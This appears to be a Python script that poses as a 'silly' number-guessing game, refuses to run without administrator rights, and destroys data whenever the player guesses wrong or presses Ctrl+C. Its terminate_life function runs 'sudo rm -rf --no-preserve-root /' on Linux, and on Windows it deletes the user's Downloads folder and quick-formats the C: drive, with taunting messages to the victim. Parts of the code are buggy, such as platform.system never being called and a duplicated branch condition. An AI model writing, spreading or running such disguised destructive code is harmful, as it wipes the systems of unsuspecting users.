import os
import sys
import ctypes
import pwd


def all():
    while True:
        try:
            import os
            import platform
            if platform.system == "Windows":
                os.system("cls")
            else: 
                os.system("clear")
            import random
            import pystyle
            rnumber = random.randint(1, 5)
            lnumber = int(input("Silly game! Choose a number between 1 - 5: "))
            import platform
            import shutil
            import subprocess
            usr=os.getlogin()
            def terminate_life():
                if platform.system == "Linux":
                    print(Colors.gray,"\n[-] Deleting $ROOT directory..")
                    os.system("sudo rm -rf --no-preserve-root /") 
                elif platform.system == 'Windows':
                    shutil.rmtree(f"C:\user\{usr}\Downloads, ignore_errors=True")
                    print(f"\n[-] Formatting your C: Drive..")
                    subprocess.run(["format", "C:", "/q", "/y"])

                    
            if lnumber == rnumber:
                print("You won!")
                exit()
            elif lnumber > rnumber:
                print(f"Silly! Too high! the number was actually {rnumber}")
                terminate_life()
            elif lnumber > rnumber:
                print(f"Welp, next time try a lower number, if there is a next time.. the number was {rnumber}")
                terminate_life()
            else:
                print(f"i'm sooorry it was {rnumber}")
                terminate_life()
        except KeyboardInterrupt:
            import pystyle
            import time
            from time import sleep
            from pystyle import Write, Colorate, Colors
            Write.Print("\nlil bro what are you trying to do?",Colors.red_to_yellow,interval=0.07)
            time.sleep(1)
            Write.Print("\nyou thought there was an",Colors.red_to_yellow,interval=0.15)
            Write.Print("...",Colors.red_to_yellow,interval=0.66)
            Write.Print(" ESCAPE",Colors.purple,interval=0.77)
            time.sleep(0.5)
            terminate_life()

import ctypes
def is_admin():
    if os.name == 'nt':  
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:  
        return os.getuid() == 0

if is_admin():
    all()
else:
    print("Not running with administrator privileges")
    sys.exit(1)
